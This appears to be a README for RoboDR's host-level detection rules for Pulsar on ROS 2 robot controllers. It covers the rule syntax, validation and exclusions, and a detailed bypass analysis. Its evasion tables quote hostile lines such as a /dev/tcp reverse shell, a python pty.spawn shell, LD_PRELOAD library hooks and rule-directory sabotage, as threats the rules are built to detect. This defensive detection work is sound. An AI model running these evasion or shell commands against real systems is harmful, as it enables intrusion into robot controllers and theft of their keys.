# RoboDR host rules for Pulsar's rules engine

The `.toml` files in `rules/robodr/` are robot-specific detection rules for the
Pulsar `rules-engine` module. They cover host-level robot threats that Pulsar's
standard process, file and network probes can already see, so they need no
robot-specific sensor. Detections that need DDS graph context, such as an
unknown participant or an off-profile topic, live in `robodr-sensor-ros2` and
not here.

The old `rules/robot.toml` has been removed. It would not have loaded (see
[What was wrong with robot.toml](#what-was-wrong-with-robottoml)).

Everything below was checked against the vendored Pulsar at rev `4796504`
(`0.11.0-alpha.1`).

## Format and deployment (verified from source)

* **Format:** TOML, not YAML. The engine loads `<rules_path>/**/*.toml`
  recursively (`crates/modules/rules-engine/src/engine.rs:14,113`). The default
  `rules_path` is `/etc/pulsar/rules`, and Pulsar's installer puts its own rules
  there.
* **Deploy:** the RoboDR package (`packaging/build-deb.sh`) installs these
  files to `/usr/share/robodr/rules/robodr/` and Pulsar's own rules to
  `/usr/share/robodr/rules/pulsar/`, and sets `rules_path =
  "/usr/share/robodr/rules"` in `/etc/robodr/pulsar.toml`; the daemon is
  `robodr-pulsard.service`. With upstream Pulsar instead, copy `rules/robodr/`
  to `/etc/pulsar/rules/robodr/`. Restart the daemon after a change: rules are
  read only at module start.
* **Document:** `[[rules]]` tables. Every rule needs all six string keys:
  `name`, `type`, `category`, `severity`, `description` and `condition`
  (`engine.rs:23-30`). Pulsar silently ignores any other key.
* **`category`** must be a MITRE ATT&CK tactic in snake_case:
  `command_and_control`, `credential_access`, `defense_evasion`, `discovery`,
  `execution`, `exfiltration`, `generic`, `impact`, `initial_access`,
  `lateral_movement`, `persistence`, `privilege_escalation`, `reconnaissance`
  or `resource_development`. There is **no** `robotics` category. So that a
  SOC (or agentd's `host_threats` input) can recognise robot threats, every
  rule name here starts with **`RoboDR: `**. The threat event carries the rule name as its
  description (`engine.rs:97-104`).
* **`severity`** must be `low`, `medium`, `high` or `critical`.
* **One bad rule disables everything.** If any rule fails to parse or compile,
  `RuleEngine::new` returns an error, so the whole rules-engine module fails,
  Pulsar's own rules included. Always run the validator before deploying.

### DSL facts that matter (from `dsl.lalrpop` and validatron)

| Topic | Behaviour |
|---|---|
| `AND` / `OR` | **Equal precedence, left-associative.** `a OR b AND c` means `(a OR b) AND c`. Always use parentheses (the validator warns). |
| `NOT` | Applies to one simple condition or one parenthesised group. |
| `IN [..]` | Expands to `f == v1 OR f == v2 ...`, so it only works on types that support `==`. It does not work on `argv`. |
| String literals | Use double quotes. Escapes are **not** processed. Digits may be unquoted. Booleans must be quoted: `"true"` / `"false"`. |
| `String` fields | `== != < > <= >=`, `STARTS_WITH`, `ENDS_WITH`, `CONTAINS` (substring). Matching is case-sensitive. There is no regex. |
| `payload.argv` (`Argv`) | **Only `CONTAINS`**, which matches **one whole argv element exactly**. It cannot match a substring of the command line. `argv[0]` is included. If argv is longer than the probe buffer, it arrives **empty**. |
| `payload.flags` (`FileFlags`) | **Only `CONTAINS`**, with one of `O_RDONLY O_WRONLY O_RDWR O_CREAT O_EXCL O_NOCTTY O_TRUNC O_APPEND O_NONBLOCK O_DIRECTORY`. The access modes are compared as an equality test on the mode, and the other flags as a bit test. |
| `*.ip` (`IpAddr`) | **Only relational operators.** There is no `STARTS_WITH`, so write a CIDR as a `>=` / `<=` range. Every IPv4 address sorts before every IPv6 address. |
| `header.image` | The process image **at the time of the event**. On an `Exec` event it is the **new** image (the same as `payload.filename`), **not the parent**. Pulsar exposes only `header.parent_pid`. It is the execve path **verbatim** (not normalised, not symlink-resolved), so it is attacker-chosen: any binary can be *named* `dpkg` or exec'd as `/opt/ros/x/../../../tmp/y`. See [Exclusion policy](#exclusion-policy). |
| File-event paths | `FileOpened`/`FileCreated`/`FileRename`/`FileLink`/`ElfOpened` paths come from `get_path_str` (a dentry walk), so they are resolved: no `..`, no symlink components. Directory prefixes on these are sound, with the limits in [Bypass analysis](#bypass-analysis) (bind mounts, >100 components, containers). |
| `Exec payload.filename` | `bprm->filename` as passed to execve when the path is absolute (it is **not** symlink-resolved: `/bin/sh` stays `/bin/sh`), or the resolved path when it is relative. `fexecve`/`execveat(AT_EMPTY_PATH)` (including memfd payloads) give `/dev/fd/N`. This is why the rules use `ENDS_WITH "/name"` and treat non-canonical and fd/`/proc` exec paths as signals of their own. |
| `header.container` | `Option`: use `header.container.is_some()` or `header.container?.image`. |
| Event types | `FileCreated FileDeleted DirCreated DirDeleted FileOpened FileLink FileRename ElfOpened Fork Exec Exit ChangeParent CredentialsChange Bind Listen Connect Accept Close Receive DnsQuery DnsResponse Send Custom Empty` |
| Connect payload | `destination.{ip,port}` and `is_tcp`. The module README mentions a `source` field, but the struct has none. |
| FileLink payload | `source` is the **new link** and `destination` is the **target**. For a symlink, the target is the raw string and may be relative. |

## Validation harness

```
python3 scripts/validate_rules.py --pulsar-src vendor/pulsar --strict   # or /home/claude/robodr/vendor/pulsar
python3 scripts/validate_rules.py --self-test
```

CI (`.github/workflows/ci.yml`) runs the first line; it fails on any error,
including a false positive in the benign corpus (step 7 below).

The harness uses only the Python standard library (3.11+ for `tomllib`). It:

1. Re-implements the engine's load path: file glob, document schema,
   Category/Severity enums, and the `PayloadDiscriminant` check on `type`.
2. Re-implements the LALRPOP grammar, including its precedence traps.
3. Type-checks every `header.*` / `payload.*` path, operator and literal
   against a schema embedded in the script. Each entry carries a comment with
   the Pulsar source file and line it came from.
4. Runs `scripts/rules_fixtures.json`: 429 sample events, with at least one
   positive and one negative per rule. They are evaluated with the engine's
   matching semantics. Fixtures marked `KNOWN GAP` document misses on purpose,
   `KNOWN FP` / `KNOWN NOISE` document accepted hits.
5. If the Pulsar source is available, it also re-extracts `Payload`, `Header`,
   `Host`, `ContainerInfo`, `Category`, `Severity` and `UserRule` from the
   source and **fails on drift**. It checks the grammar itself against
   `dsl.lalrpop` (operator tokens, keywords, every terminal, and fingerprints
   of the productions the checker hard-codes: AND/OR equal precedence, NOT on
   one simple condition, IN, literal regexes, no unescaping), and the operator
   families each field type accepts against the Validatron impls
   (`builtins.rs`, `Argv`/`FileFlags` in `event.rs`, `ModuleName`) plus the
   `FileFlags` names. A built-in mutation test proves these drift checks fire
   (renamed or added operator, OR given its own precedence, `IpAddr` gaining
   `STARTS_WITH`, ...). It then validates Pulsar's own 89 shipped rules, which upstream's
   `shipped_rules_are_valid` test proves compile in the real engine. That
   calibrates the checker.
6. Runs a self-test of 88 cases that must be rejected or accepted. This
   includes the original `robot.toml`, the review PoC literals, a corpus
   of literals whose expected result was produced by the Rust std parsers,
   and a check that the benign-corpus runner reports a false positive, a
   stale allowance and an incomplete event.
7. Runs the **benign corpus** `scripts/rules_benign_corpus.json` (mandatory;
   a missing file is an error): 201 events in eight scenarios (`ros2 launch`
   with dict parameters and SROS 2, `ros2 bag` record/play from `/tmp`, an
   rclpy node loading torch weights, `colcon build` in a dev workspace,
   `apt-get upgrade` with a kernel (dpkg, depmod, update-initramfs, ldconfig
   trigger, py3compile, service restart), systemd user units, and a RoboDR
   signed-bundle upgrade: `dpkg -i`, `.dpkg-new` + rename of both daemons,
   the units, a rule file and the `pulsar.toml` conffile, postinst
   `try-restart`, PID 1 starting the units (credentials, invocation link,
   propagate dir) and both daemons reading their config and rules, and a
   CMake 3.28 FindPython configure with every probe text). **Every**
   rule of the event's type is evaluated against every event, not just the
   rule a fixture names. Any hit fails, unless the event lists that rule in
   `allow` with a `reason`; an `allow` entry that no longer fires also fails,
   so allowances cannot pile up. The 14 allowed hits are the apt and
   RoboDR-bundle audit trail (package install, maintainer script, package
   database: 7), py3compile's `.pyc` writes in `/usr/lib/python3` (4: the
   library rules and the Python-environment rules, deliberate, see below),
   the two CMake FindPython probes that cannot be excluded, and one
   `python3 setup.py` from the dev source tree.
   The events are modelled on the named tools' behaviour (sources and
   local traces listed in the file header), **not** captured from pulsard.

The last run gave: self-test 88/88; drift mutation test 12/12; 89/89
upstream rules accepted; no schema or grammar drift; 62 RoboDR rules in 7
files; 429/429 fixtures pass; benign corpus 201 events, 0 false positives,
14 allow-listed hits; 0 errors and 0 warnings (`--strict`; the FindPython
exclusion's literals with spaces are accepted because the same AND chain pins
`payload.argc == 3`, see the CMake note below). Mutation checks showed the harness catches problems: flipping every
negative fixture gave 44 errors, and changing `argv: Argv` in a copy of
`event.rs` was reported as drift.

### Validator vs. Rust parsing (literals)

A literal the Rust side cannot parse makes `RuleEngine::new` fail, which
disables **every** rule, Pulsar's included. The validator therefore mirrors
the Rust `FromStr` impls validatron calls, not Python's:

| Type | Rust parser | Accepted |
|---|---|---|
| `i32` | `i32::from_str` | `^[+-]?[0-9]+$` (ASCII), in range. |
| `u32`/`u16`/`usize` | `uN::from_str` | `^\+?[0-9]+$` (ASCII, **no** `-`, not even `-0`), in range. |
| `IpAddr` | `std::net::IpAddr::from_str` | ASCII dotted quad without leading zeros, or RFC 4291 text form (embedded IPv4 allowed). **No** zone id (`%eth0`), brackets or whitespace. |
| `bool` | `bool::from_str` | exactly `true` / `false`. |
| `FileFlags` | name lookup in `event.rs` | the ten flag names. |
| `String`, `ModuleName`, `Argv` | infallible | anything. |

Python's `int()` accepts `1_000`, `" 7 "` and full-width digits, and
`ipaddress` accepts `fe80::1%eth0`; the old validator used them and passed
rules that would have taken the engine down (review finding). The new parsers
were checked against a small Rust program (rustc 1.97, `u32`/`i32`/`u16`/
`usize`/`bool`/`IpAddr::from_str`) over ~310k random literals with no
disagreement (re-run for this change); the Rust-generated corpus is part of `--self-test`. The lexer's
whitespace class is also the Rust regex `\s` (Unicode White_Space), not
Python's `\s`, which additionally matches `\x1c`-`\x1f`.

## Exclusion policy

Every exclusion (`AND NOT ...`) is a bypass waiting to happen if the attacker
controls the matched string. Rules here follow these rules:

* **`header.image` exclusions use exact paths** (`== "/usr/bin/dpkg"`, plus
  `/bin/dpkg` for usr-merged systems where both are the same file). Never
  `ENDS_WITH "/dpkg"`: the review showed `/root/.cache/dpkg` writing a rootkit
  `.ko` unflagged. A non-canonical spelling of the real path (`/usr/bin/../bin/dpkg`)
  is not excluded, which fails safe (the rule fires).
* **`header.image` prefix allowlists** (enclave key reader) also require
  `NOT header.image CONTAINS "/../"`, and the install tree they trust is
  watched for writes, renames **and links** (`ros2_stack.toml`).
* **File-path prefixes** on `payload.*` are fine (kernel-resolved), as long as
  the directory is itself write-protected or watched.
* **File-name allowlists** (RMW libraries) are anchored to the dpkg-managed
  `/opt/ros/` tree, so borrowing an allowlisted name elsewhere does not help.
* The real `/usr/bin/dpkg` run with an injected library (`LD_PRELOAD`) writes
  as "dpkg". Two rules watch what dpkg loads (a `.so` outside the system
  library paths, or any ELF with `elf_check`); a hook with no `.so` name and
  `elf_check` off is still missed, and so is a hook placed inside
  `/usr/lib` (which needs root and trips the library-write rules).

### Maintenance-time exclusions (update-initramfs, depmod, ldconfig, systemd)

Each is keyed on the **exact image** of the one tool that does the benign
thing, plus everything else that is fixed about it. All are covered by
benign-corpus events and by negative fixtures showing that a different
image, uid or path still fires.

| Exclusion | Rules | Exact key | Residual |
|---|---|---|---|
| update-initramfs staging tree | `.ko` written (`cp`); ELF opened from a temp dir (`depmod`, `ldconfig`/`ldconfig.real`, `cpio`); `.so` opened from a temp dir (`ldconfig`/`ldconfig.real`, `cpio`) | `header.uid == 0` AND path under `/var/tmp/mkinitramfs_` AND image in that rule's set (both `/usr/...` and `/...` spellings) | Root can stage a `.ko`/ELF there with `cp`, or read one there with `cpio`. Loading it still needs `finit_module` from an open the ELF rules see (by the loader's image), `insmod` (Pulsar's own rule), or a move into `/lib/modules` (rename/link rules). If apt runs with `TMPDIR` set, the staging tree moves: TUNE. |
| depmod index files | file created / renamed in a system library path | image `depmod` AND path under `/usr/lib/modules/` or `/lib/modules/` AND name contains `/modules.` | The real depmod only writes indexes derived from the `.ko` files present, which are watched. |
| ldconfig soname links | link created in a system library path | image `ldconfig`/`ldconfig.real`, **symlink** (`hard_link == false`), target is a bare name (no `/`), link not under `/etc/` | Verified on Ubuntu 24.04 glibc: ldconfig `unlink()`s a stale link and `symlink()`s a bare name; no rename. ldconfig can only link to libraries already in that directory, which the write rules watch. |
| systemd-executor | executed from fd or `/proc` | `/proc/self/fd/*` + argv contains executor path and `--deserialize` + (uid 0 and parent PID 1, **or** parent not PID 1 and uid in the TUNE list of user-manager accounts, default 1000) | Argv is attacker text: root can mimic the system form, and code already running as a listed uid can mimic the user form. Other uids and root's own user manager still fire. |

Deliberately **not** excluded, and allow-listed in the benign corpus with
the reason: py3compile writing `__pycache__/*.pyc` into `/usr/lib/python3`
(a forged `.pyc` is a code hook; precompile at commissioning), the two
CMake 3.28 FindPython `python3 -c` probes that no DSL literal can express
(17 of the 19 probe texts **are** excluded by exact argv in the one-liner
rule; see the CMake note below), and the apt/dpkg audit-trail rules.

## Deployment: ELF check and noexec (needed for full hook coverage)

The dynamic loader maps any file `LD_PRELOAD` names, whatever its name. Name
rules (`*.so`) cannot see `/home/robot/.cache/hook`. Coverage, strongest first:

1. **Mount `/tmp`, `/var/tmp`, `/dev/shm` and `/run/user` with `noexec`.** The
   kernel then refuses `PROT_EXEC` mappings of files there, so a staged hook
   cannot be loaded at all. This is prevention, not detection; do it on the
   image. (`/dev/shm` is not covered by any name-independent FileOpened rule,
   because DDS shared-memory transports open arbitrary files there.)
2. **Enable Pulsar's ELF check** so the two `ElfOpened` rules work:
   ```toml
   [module.file-system-monitor]
   enabled = true
   elf_check = true
   elf_check_whitelist = ["/proc", "/sys", "/dev"]
   ```
   `elf_check` (default **false**) makes pulsard open every opened file and
   read its magic (`file-system-monitor/src/lib.rs` `check_elf`/`is_elf`), and
   emits a derived `ElfOpened` event with the original header. Keep `/dev`
   whitelisted: pulsard would otherwise open device nodes (a watchdog device
   arms on open). Limits: the check runs **after** the open, in pulsard's mount
   namespace, so a hook unlinked right after loading, or a path that only
   exists inside a container, is missed. CPU cost is one extra open+read per
   file open; Pulsar logs a warning when a check takes >10 ms. **Not measured on
   the target controller.**
3. Without `elf_check`, the FileOpened fallback catches `*.so` names anywhere
   outside the allowlist, and any new, linked, renamed or overwritten file
   (any name) in the system library directories. It no longer flags plain
   reads of other files from `/tmp` or `~/.cache` (re-review finding: every
   `ros2 launch` node reads `/tmp/launch_params_*` via `--params-file`,
   `ros2 bag play` reads `/tmp`, torch reads `~/.cache/torch/*.pth`). A name
   cannot separate a hook from data (the loader ignores names), so a hook
   **without** a `.so` name in a staging directory is caught only by content
   (step 2) or prevented (step 1). **Treat `elf_check = true` and the noexec
   mounts as required** on a fielded unit.

## Bypass analysis

What an attacker can do to a string-matching rule depends on where the string
comes from. Two very different sources:

* **File-event paths** (`FileOpened`, `FileCreated`, `FileDeleted`,
  `FileRename`, `FileLink`, `ElfOpened`) are rebuilt by `get_path_str` from the
  dentry and mount the kernel actually used. `..`, `.`, `//`, symlinks in the
  path and relative paths are gone. Case cannot be played with either (Linux
  file systems are case-sensitive; vfat/exfat media are the exception and
  only matter to name rules such as `.ko`).
* **Exec paths** (`Exec payload.filename`, and `header.image` of every later
  event of that process) are `bprm->filename` **verbatim** when the path is
  absolute. Nothing is normalised or resolved. `argv[0]` is never used to
  identify a program here (it is free text), but the exec path is just as
  attacker-chosen whenever the attacker runs the program.

### Closed by rules in this directory

| Evasion | Closed by |
|---|---|
| Binary *named* `dpkg` (`/root/.cache/dpkg`) writing modules/libraries/nodes | Exact-path `header.image == "/usr/bin/dpkg"` exclusions everywhere (review finding). |
| Hook library without `.so` in its name (`/home/robot/.cache/hook`) | `ElfOpened` rules (by content; need `elf_check`); noexec staging mounts. The name-based any-file arm was removed (it fired on every `ros2 launch`). |
| Hard link / symlink / `open(O_TMPFILE)`+`linkat()` that puts a `.ko`, a library, a linker or module-autoload config, a wireless config, an enclave file or a Pulsar/RoboDR file in place with no create, write or rename event | `FileLink` rule beside every `FileRename` rule (`source` is the new link), plus the in-place write rule for library directories (catches the `O_TMPFILE` open and `cp` over an existing library). |
| `mkfifo /etc/pulsar/rules/zz.toml` / symlink to `/dev/null` so the rules engine hangs or fails at the next start | **File or device node created** and **Link created in or to** a RoboDR/Pulsar protected path (now also `/usr/share/robodr/rules`, the real `rules_path`). |
| Moving or deleting a protected *directory* (`/etc/pulsar`, `/usr/share/robodr/rules`) instead of its files; a systemd drop-in, mask link or `set-property` override for `robodr-*.service` | Directory **renamed** / **created** / **deleted** rules and the systemd unit paths in every self-protection rule. |
| `PYTHONINSPECT=1 script -qc /opt/ros/humble/bin/ros2 /dev/null`: a Python prompt inside the trusted `/opt/ros` image after the CLI exits | Partly: **Pseudo-terminal wrapper executed** (`script`, `expect`, `unbuffer`, `empty`, `screen`, `tmux`, `dtach`), **Login shell started** (sshd/getty/`su -`/`sudo -i` sessions, the pty you need without a wrapper), **Interactive or stdin-fed Python interpreter** (`python3 -i`, bare `python3`, `python3 -`), `python3 -c 'import pty...'` (one-liner rule), `PYTHONSTARTUP=*.py` (Python-import rule). See the residual below. |
| `/usr/../tmp/x`, `//tmp/x`, `/./tmp/x` to dodge "executed from a temporary directory" | **Program executed through a non-canonical path.** |
| `//opt/ros/...` or `/opt/ros/a/../a/...` so a hooked ROS node falls outside the `/opt/ros/` scope | Same rule (fires at exec); the enclave-key allowlist also rejects `/../`. |
| `/proc/self/exe`, `/proc/<pid>/exe`, `/proc/<pid>/root/...`, `fexecve`/`execveat` on an fd, `memfd_create` "fileless" payloads (`/dev/fd/N`) | **Program executed from a file descriptor or /proc path.** |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `perl -e`, `node -e`: a shell with no `-i` | **Interpreter one-liner executed.** |
| `bash -c 'bash >& /dev/tcp/h/p 0>&1'` (no `-i`, no extra binary) | **Shell or netcat-style tool opened a network connection.** |
| `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `GCONV_PATH`: all make the loader open an ELF | Library/ELF rules (by name and, with `elf_check`, by content). |
| `PYTHONPATH`, `PYTHONHOME`, user site-packages, `sitecustomize`/`.pth`: code inside a trusted rclpy node or the `ros2` CLI, under a trusted `/opt/ros` image | **ROS 2 process imported Python code from outside the allowlisted paths.** |
| `ROS_SECURITY_KEYSTORE` / `ROS_SECURITY_ENCLAVE_OVERRIDE` pointing a node at an attacker keystore (attacker governance/permissions) | **SROS 2 security files loaded from outside the commissioned keystore.** |
| `LD_PRELOAD` into the *real* `/usr/bin/dpkg` to borrow its trusted image | **Package manager loaded a library / mapped an ELF from outside the system paths.** |
| `/bin/python3` instead of `/usr/bin/python3` (usr-merged) to leave the Python scope | Both spellings are in scope. |
| Staging in `/run/lock` or `/var/crash` (world-writable on Ubuntu) | Added to every temp-directory list. |
| `python3 -mpip install` | Added to the pip rule. |
| Write a module/library/node under a harmless name, then rename | `FileRename` rules on the destination. |
| Hard link to an enclave key from an innocuous path, then read that | Link rule (hard-link target is a resolved path). |
| IPv4-mapped IPv6 (`::ffff:8.8.8.8`) to dodge the IPv4 private ranges | Not in any allowlisted range, so the connect rule fires (fixture). |

### Inherent to eBPF/path matching (documented, not closed by rules)

These are limits of what Pulsar's probes record, not tuning mistakes. Each
needs prevention (hardening) or a probe change.

* **Renamed or copied tools.** Exec rules identify tools by name
  (`ENDS_WITH "/gdb"`, `/bluetoothctl`, `/pip3`, shells). A copy under
  another name (`/opt/x/kworker -i`) is a different file name; only the
  temp-directory and non-canonical rules can still see it, and a copy in, say,
  `/home/robot/bin` is invisible. A symlinked *directory* (`/home/u/l -> /tmp`,
  exec `/home/u/l/x`) also defeats the temp-directory rule. Prevention: mount
  staging directories `noexec`, remove the tools from the image.
* **Exec-path exclusions trust argv and parent_pid.** The systemd-executor
  exclusion can be mimicked by root (double fork to PID 1 + copied argv),
  and the user-manager form by code already running as a listed service
  uid (fexecve + copied argv); fixtures record both.
* **Code typed into a trusted interpreter.** `PYTHONINSPECT` (and
  `PYTHONSTARTUP` with a non-`.py` name) are environment variables, which
  Pulsar does not capture. Once an attacker has a pty that no rule saw
  (`ssh -t robot 'PYTHONINSPECT=1 ros2 ...'` runs `bash -c` with a pty and
  no login shell; `socat ...,pty` is one argv element), the Python prompt
  runs inside `/opt/ros/humble/bin/ros2`: the enclave key read and a
  connect to a cell address look exactly like the `ros2` CLI with security
  enabled, which legitimately reads keys. Not detectable with rules;
  mitigate with per-node file ownership of `key.pem` (only the node's uid
  can read its own enclave key), no interactive accounts on fielded units,
  and the env-capture follow-up below.
* **CMake FindPython probes** (`python3 -c "import sys; ..."`) fire the
  one-liner rule during `colcon build` on the unit. CMake 3.28.3 has 19
  distinct probe texts (traced with strace and derived from
  `Support.cmake`): 17 can be written as exact-argv exclusions (argc 3,
  exact interpreter path and `argv[0]`, `-c`, the whole probe text); one
  contains a `"` (no DSL literal can hold one) and one a backslash (the
  engine keeps it verbatim, but `validate_rules.py --strict` rejects every
  backslash in a literal). The 17 are excluded in the one-liner rule
  (fixtures show that an extra element, appended code, another interpreter
  path or `argv[0]`, or `-Ic` still fire); the other two still fire and are
  allow-listed in the benign corpus. **Validator note:** every probe text
  contains spaces. `validate_rules.py` warns on an `argv CONTAINS` literal
  with a space (it is one whole element, never a command-line substring)
  *unless* an enclosing AND chain of the same rule requires
  `payload.argc == N`; the exclusion pins `argc == 3`, so it is accepted and
  `--strict` is clean. A literal with a space without a pinned argc, or
  with the pin only in an OR sibling, is still warned about.
* **No environment, no parent image.** Pulsar's `Exec` event has neither.
  `ROS_SECURITY_ENABLE=false` / `ROS_SECURITY_STRATEGY=Permissive` (security
  switched off) leave **no** file trace at all: nothing is opened. Inline DDS
  configuration (`CYCLONEDDS_URI='<CycloneDDS>...'`) is likewise invisible;
  file-based DDS profiles are not watched. `AMENT_PREFIX_PATH` pointing
  `ros2 launch` at another install tree is only seen if that tree is under a
  staging directory or the launched binaries trip another rule.
* **Interpreters with code on stdin or from a file in an allowlisted
  directory.** `python3 - < payload` is now flagged, but adding `-m` and
  `py_compile` elements (the py3compile worker exclusion) evades it;
  `python3 -Ssc` (unlisted bundle), and a reverse shell written with
  `socket` in Python (the shell-connect rule covers shells and nc-style
  tools, not interpreters). Fixtures record these.
* **argv matching is exact per element.** Bundled options outside the listed
  set (`bash -xvi`, `dpkg -iE`), code glued to its option (`python3
  -cimport os`, `perl -e'...'` written without a space) and
  `python3 /usr/bin/pip3 install` are missed; the file-based backstops
  (package database, Python import) still fire. Perl bundles ending in `e`
  (`-we`, `-wle`, `-lane`, ...) and more Python `-?c` bundles are listed.
* **Kill by PID or by pattern.** `kill -9 <pid>`, `pkill puls`, `systemctl stop
  'puls*'` are not recognisable as "stop Pulsar". A dead sensor has to be
  detected by absence (heartbeat at the SOC), not by a rule.
* **File operations Pulsar has no hook for:** `truncate(2)` by path,
  `chmod`/`chown`/`setxattr`, `mount` (a bind mount over `/etc/pulsar/rules`
  or over the keystore changes what later opens resolve to and what paths
  look like: a key read through a bind mount of `enclaves/` is reported under
  the mount point, without `/enclaves/`), `ptrace`, `process_vm_writev`,
  `init_module`/`finit_module` (a module file with no `.ko` name is invisible;
  enforce `module.sig_enforce=1`/lockdown or `kernel.modules_disabled=1`).
  Unprivileged user namespaces make bind mounts available to non-root users:
  disable them (`kernel.apparmor_restrict_unprivileged_userns=1` on Ubuntu
  24.04, or `user.max_user_namespaces=0`).
* **Path reconstruction limits.** `get_path_str` keeps at most 100
  components and walks at most 100 steps: a file more than ~100 directories
  deep loses its **leading** components, so prefix rules (`STARTS_WITH
  "/tmp/"`) miss it while suffix rules and allowlists (deny-by-default `NOT
  STARTS_WITH ...`) still fire. Paths inside containers are container-relative.
  Files opened through `open_by_handle_at` (root) can have disconnected
  dentries and partial paths.
* **Writes through an fd opened before pulsard started**, or passed in over a
  UNIX socket, produce no new open event.
* **Injection into an already trusted process.** Code running inside a ROS
  node (via ptrace, `/proc/<pid>/mem` from a debugger copy, or an exploit)
  acts under that node's image; the `/proc/<pid>/mem` write rule sees only the
  `/proc` route.
* **`elf_check` races.** It reads the file after the open, from pulsard's
  mount namespace: a hook unlinked immediately after loading is missed.

## The rules

TUNE values that must be set per robot during commissioning:

* `/opt/ros/`: the ROS 2 install prefix.
* `/opt/robot_ws/install/`: the robot's colcon workspace install prefix.
* The cell and fleet subnets.
* The commissioned RMW library.
* The service and daemon names in the stop-service rule (default: the
  packaged `robodr-pulsard` / `robodr-agentd`).
* The image of the signed update agent.
* `/opt/robot_keystore/`: the commissioned SROS 2 keystore root.
* The systemd-executor exclusion (systemd >= 255 only), including the uid
  list of service accounts that run a `systemd --user` manager (default
  1000).
* The initramfs staging prefix `/var/tmp/mkinitramfs_` (moves if apt runs
  with `TMPDIR` set).

Each of these is marked `TUNE` in the files.

### `ros2_stack.toml`: the control stack

| Rule | Threat (ROADMAP §0) | False positives / notes |
|---|---|---|
| Interactive shell started on robot controller | Host compromise / reverse shell (demo scenario, Sprint 4) | Operator SSH sessions that run `bash -i`. A login shell is `-bash` with no `-i`; the next rule covers it. This cannot be limited to shells spawned by ROS nodes (no parent image). |
| Login shell started on robot controller | Interactive pty session (sshd, getty, `su -`, `sudo -i`): the precondition for `PYTHONINSPECT` code inside a trusted interpreter | Every maintenance login. `ssh -t host cmd` is not a login shell and is not seen. |
| ROS 2 process connects outside the robot's networks | C2 / datalink compromise, exfiltration of stolen keys | Only covers C++ nodes under the two prefixes. rclpy nodes run as `/usr/bin/python3.x` and are not covered. Allowlist the fleet gateway if it sits outside private space. UDP DDS traffic mostly uses `sendto`, not `connect`, so this rule mostly sees TCP plus connected UDP. |
| ROS 2 install tree written outside the package manager | Trojaned/modified node, launch or param files | Root-run rclpy nodes writing `__pycache__`. Fix this by precompiling at commissioning or running nodes unprivileged. `colcon build` on the unit is a dev-only activity. |
| File created or moved into the ROS 2 install tree… | Same, via atomic replace | Same as above. |
| Link created inside the ROS 2 install tree… | Symlink/hard link that makes an attacker binary run under a trusted `/opt/...` image path, or swaps a node | `colcon build --symlink-install` on the unit (dev only). |
| Shell or netcat-style tool opened a network connection | Reverse shell without `-i` (`bash >& /dev/tcp/...`), raw-socket C2 | None expected: shells do not open sockets. Destinations inside the cell are deliberately not excluded. |

### `sros2_keystore.toml`: SROS 2 keystore (Sakib et al. 2025; captured unit)

| Rule | Threat | False positives / notes |
|---|---|---|
| Enclave private key read by a process outside the ROS stack | Keystore exfiltration → authenticated rogue participant | rclpy nodes (python3) and the `ros2` CLI with security enabled. Allowlisting python3 is a deliberate trade-off (see the file header). Backup tools. |
| CA private key accessed on robot | CA keys must never be on a unit | None in a correct deployment. Matches only the SROS 2 names `private/{ca,identity_ca,permissions_ca}.key.pem`, so ordinary TLS keys such as `/etc/ssl/private/server.key.pem` no longer match. |
| Keystore file written | Widened permissions / swapped identity | Re-provisioning during commissioning. |
| Keystore file renamed or replaced | Same, by atomic rename, or a key moved out | Same. |
| Link created to an SROS 2 private key | Reading the key via an innocuous path | Matches any `*key.pem` target, so TLS keys named like that elsewhere also match. |
| Link created inside an SROS 2 enclave directory | Swapping governance/permissions/certs/keys by symlink, hard link or `O_TMPFILE`+`linkat` | Re-provisioning. |
| SROS 2 security files loaded from outside the commissioned keystore | `ROS_SECURITY_KEYSTORE` redirected to an attacker keystore (attacker governance/permissions) | Set the keystore root (TUNE). Re-provisioning into a new directory. |

### `runtime_hooking.toml`: one-env-var hook ("Seeing is Not Believing", 2026)

Pulsar's `Exec` event has **no environment variables**. Because of that,
`LD_PRELOAD`, `LD_LIBRARY_PATH` and `RMW_IMPLEMENTATION` are detected by their
effect: the loader opening the library.

| Rule | Threat | False positives / notes |
|---|---|---|
| ROS 2 process loaded a library outside allowlisted paths | LD_PRELOAD / LD_LIBRARY_PATH hook into a node (`*.so` / `*.so.N` names; other names: the `ElfOpened` rules) | Covers every `python3` process, not only ROS ones: venvs, `pip --user`, vendor SDK directories (e.g. CUDA under `/usr/local/cuda*`: TUNE). Plain data reads (`/tmp/launch_params_*`, bags, weights) no longer match. |
| ROS 2 process mapped an ELF from outside the allowlisted paths (`ElfOpened`) | Same hook, by **content** (any file name) | Needs `elf_check = true`. A launch file exec'ing a binary from a non-standard directory. |
| ELF opened from a world-writable or user cache directory (`ElfOpened`) | Staged hook / implant, any process, any name (read-only opens) | Needs `elf_check = true`. update-initramfs staging excluded (table above). One-step `gcc x.c -o x` and `-flto` links read ELF objects from `/tmp`. |
| ROS 2 process loaded `/etc/ld.so.preload` | Persistent system-wide hook | None: the file should not exist. Expect one hit per node start while it does. |
| Unexpected RMW library loaded | `RMW_IMPLEMENTATION` pointed at a malicious RMW (allowlisted names count only under `/opt/ros/.../lib/`) | Set the allowlist to the robot's RMW. Library names vary by distro: **verify them on the real install**. Tools that enumerate RMWs (for example `ros2 doctor`) may also match. |
| Shared library opened from a temporary directory | Staged hook library (read-only opens) | PyInstaller onefile apps and self-extracting vendor installers. update-initramfs staging excluded. |
| Program executed from a temporary directory | Dropper / implant | Vendor installers and build systems. |
| Shared library written into a system library path outside dpkg | A hook planted where the allowlist trusts it; **any** file name, since the loader does not care | Manual `make install`, DKMS, py3compile / root-run Python byte-compiling into `/usr/lib/python3` (kept on purpose), GLib/GdkPixbuf cache updates during apt on images that ship them. depmod index files excluded. |
| File moved into a system library path or linker configuration outside dpkg | The same via create-elsewhere-then-rename | Same; also `update-alternatives` creating a link in `/usr/lib` for alternatives-managed libraries (BLAS/LAPACK) at install. |
| Link created in a system library path or linker configuration outside dpkg | The same via symlink, hard link or `O_TMPFILE`+`linkat` | ldconfig soname links excluded (table above); `update-alternatives` as above. |
| Existing file in a system library path opened for writing outside dpkg | In-place overwrite of a real library (`cp hook.so` over it: no `FileCreated`), `O_TMPFILE` in a library directory | `make install` over an existing file. |
| Dynamic linker search path changed | Persistent `LD_LIBRARY_PATH` | Non-dpkg installers. |
